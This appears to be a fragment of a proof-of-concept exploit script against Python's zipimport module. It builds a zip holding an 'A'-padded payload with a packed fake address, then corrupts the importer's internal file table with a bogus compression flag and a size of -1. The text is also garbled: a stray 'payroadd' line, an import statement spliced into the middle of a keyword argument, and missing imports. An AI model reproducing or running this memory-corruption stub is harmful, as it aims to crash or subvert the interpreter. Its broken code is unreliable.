FILE = 'load'
ZIP = 'import.zip'

payroadd= bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mfrom signal import *ode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
